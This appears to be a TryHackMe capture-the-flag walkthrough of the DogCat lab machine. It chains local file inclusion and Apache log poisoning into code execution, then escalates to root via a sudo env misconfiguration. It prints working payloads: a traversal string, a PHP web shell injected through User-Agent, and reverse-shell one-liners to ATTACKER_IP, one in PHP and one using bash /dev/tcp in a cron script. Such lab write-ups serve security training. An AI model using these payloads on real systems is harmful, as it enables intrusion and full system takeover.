# DogCat - TryHackMe Walkthrough

## Overview

**DogCat** is a beginner-friendly Linux machine on TryHackMe that demonstrates how a Local File Inclusion (LFI) vulnerability can be chained into Remote Code Execution (RCE) using Apache log poisoning. After obtaining an initial shell as the web server user, the room introduces Linux privilege escalation through a misconfigured `sudo` permission.

In this walkthrough, I will explain each step of the exploitation process, including the reasoning behind every action and how the attack progresses from initial access to full system compromise.

---

# Enumeration

As with any penetration test, the first step is to enumerate the target and identify potential attack vectors.

After deploying the target machine, I performed an Nmap scan to identify the running services.

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed that an HTTP service was running on port **80**, making the web application the most likely entry point.

Opening the application displayed two buttons labeled **Dog** and **Cat**. Clicking either option changed the URL by modifying the `view` parameter.

```
http://<TARGET_IP>/?view=dog
```

This behavior suggested that the application was dynamically loading files based on user input, making it a good candidate for Local File Inclusion testing.

---

# Discovering the Local File Inclusion (LFI)

Since the application appeared to include files specified by the `view` parameter, I tested for directory traversal using one of the most common payloads.

```
http://<TARGET_IP>/?view=dog../../../../../../../../etc/passwd
```

The application returned the contents of `/etc/passwd`, confirming the presence of a Local File Inclusion vulnerability.

The vulnerability exists because user input is passed directly into a PHP `include()` statement without proper validation or sanitization.

Although LFI allows an attacker to read arbitrary files from the server, it does not directly provide command execution. The next objective was to convert this file inclusion vulnerability into Remote Code Execution.

---

# From LFI to Remote Code Execution

One of the most effective techniques for turning an LFI vulnerability into RCE is **Apache log poisoning**.

Every HTTP request made to the server is recorded inside Apache's access log. By injecting PHP code into the **User-Agent** header, it is possible to write executable PHP code into the log file.

Using Burp Suite, I intercepted a request and modified the **User-Agent** header as follows:

```php
<?php system($_GET['cmd']); ?>
```

Once the request reached the server, Apache stored the payload inside:

```
/var/log/apache2/access.log
```

The vulnerable application was then instructed to include the Apache access log.

```
http://<TARGET_IP>/?view=dog../../../../../../../../var/log/apache2/access.log
```

Since the application includes the file using PHP, the injected PHP payload was interpreted instead of being displayed as plain text.

This successfully transformed the Local File Inclusion vulnerability into Remote Code Execution.

---

# Verifying Command Execution

Before attempting a reverse shell, I first confirmed that arbitrary commands could be executed.

Using the newly injected PHP payload, I executed a simple command.

```
?cmd=whoami
```

The response confirmed that commands were executing successfully on the server.

Once command execution was verified, the next objective was to obtain an interactive shell.

---

# Obtaining a Reverse Shell

To gain interactive access to the target system, I started a Netcat listener on my attacking machine.

```bash
nc -lvnp 80
```

Next, I executed a PHP reverse shell through the vulnerable `cmd` parameter.

```php
php -r '$sock=fsockopen("ATTACKER_IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

After sending the request, the listener received an incoming connection from the target.

```
connect to [ATTACKER_IP]
```

The reverse shell was successfully established as the **www-data** user.

---

# Enumerating the Web Server

With shell access established, I began exploring the web application's directory.

Listing the contents of the current directory revealed several PHP files, including `flag.php`.

```bash
ls
```

Reading the file revealed the first flag.

```bash
cat flag.php
```

A second flag was found inside another text file located within the same directory.

```bash
cat flag2_QMW7JvaY2LvK.txt
```

After collecting the available flags, I moved on to privilege escalation.

---

# Privilege Escalation Enumeration

The first step in privilege escalation was checking the current user's sudo permissions.

```bash
sudo -l
```

The output revealed the following configuration.

```
(root) NOPASSWD: /usr/bin/env
```

This indicates that the `env` binary can be executed as the root user without requiring a password.

Misconfigurations like this are commonly documented in **GTFOBins**, a resource that lists legitimate Unix binaries which can be abused for privilege escalation.

---

# Exploiting the Sudo Misconfiguration

According to GTFOBins, the `env` binary can be used to spawn a privileged shell.

Running the following command immediately resulted in a root shell.

```bash
sudo env /bin/sh
```

To verify the privilege escalation, I checked the current user.

```bash
whoami
```

The output confirmed successful privilege escalation.

```
root
```

At this stage, the system was fully compromised.

---

# Alternative Privilege Escalation (Cron Job)

While exploring the filesystem, I discovered a backup directory located at:

```
/opt/backups
```

The directory contained two interesting files.

```
backup.sh
backup.tar
```

Inspecting `backup.sh` revealed that it periodically archived the container directory using the `tar` utility.

The modification time of `backup.tar` changed regularly, indicating that the script was executed automatically through a cron job.

Because the script was writable, it could be replaced with a malicious reverse shell.

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1
```

After starting a Netcat listener and waiting for the scheduled task to execute, a root reverse shell would be established.

Although this technique demonstrates cron job exploitation, the misconfigured sudo permissions provided a quicker route to root during this assessment.

---

# Lessons Learned

This room demonstrates how multiple vulnerabilities can be chained together to achieve complete system compromise.

The attack began with a Local File Inclusion vulnerability that allowed arbitrary files to be read from the server. By poisoning the Apache access log with PHP code through the User-Agent header, the LFI vulnerability was transformed into Remote Code Execution. This allowed an interactive shell to be established as the web server user.

Finally, a misconfigured sudo rule permitting execution of `/usr/bin/env` without authentication enabled straightforward privilege escalation to root.

DogCat is an excellent room for learning how attackers combine seemingly minor vulnerabilities into a complete attack chain while reinforcing the importance of secure file inclusion, proper input validation, secure logging practices, and the principle of least privilege.

---

# Attack Chain

```
Web Application
        │
        ▼
Local File Inclusion (LFI)
        │
        ▼
Apache Log Poisoning
        │
        ▼
Remote Code Execution (RCE)
        │
        ▼
Reverse Shell (www-data)
        │
        ▼
Privilege Escalation
        │
        ▼
Root Access
```

---

## Skills Learned

- Web Enumeration
- Local File Inclusion (LFI)
- Directory Traversal
- Apache Log Poisoning
- Remote Code Execution (RCE)
- Reverse Shells
- Linux Enumeration
- GTFOBins
- Sudo Misconfiguration
- Linux Privilege Escalation
